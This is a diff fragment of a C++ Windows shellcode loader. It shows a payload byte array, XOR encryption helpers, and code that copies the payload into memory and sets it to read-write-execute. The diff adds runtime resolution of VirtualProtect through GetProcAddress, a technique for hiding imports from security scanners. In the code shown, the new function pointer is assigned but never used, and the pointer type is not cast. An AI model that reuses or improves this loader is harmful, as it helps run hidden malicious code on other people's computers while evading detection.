@@ -30,6 +30,8 @@ unsigned char payload[] = {
 };
 unsigned int payloadLen = sizeof(payload);
 
+BOOL ( WINAPI* pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD lpNewProtect, PDWORD lpflOldProtect);
+
 // XOR Encrypt
 // data = Payload
 // dataLen = Payload length
@@ -60,6 +62,8 @@ int main() {
     std::cout << "Executable Memory Address: " << static_cast<void*>(execMemory) << std::endl;
 
     RtlMoveMemory(execMemory, payload, payloadLen);
+
+    pVirtualProtect = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualProtect");
 
     returnValue = VirtualProtect(execMemory, payloadLen, PAGE_EXECUTE_READWRITE, &oldprotect);
 
